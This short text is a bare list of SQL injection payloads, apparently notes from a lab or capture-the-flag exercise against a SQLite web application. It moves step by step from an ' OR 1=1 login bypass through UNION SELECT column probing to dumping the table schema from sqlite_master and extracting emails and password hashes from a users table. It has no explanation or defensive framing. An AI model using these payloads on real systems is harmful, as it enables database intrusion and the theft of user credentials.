' OR 1=1--
'UNION SELECT 1,2,3 --
'UNION SELECT 1,2,3,4,5 --
test' UNION SELECT 'col1', 'col2', 'col3', 'col4', 'col5' --
test' UNION SELECT 1, tbl_name, 'hidden', sql, 5 From sqlite_master where type ='table' --
test' Union SElect id, email, 'hidden', password_hash, 5 from users --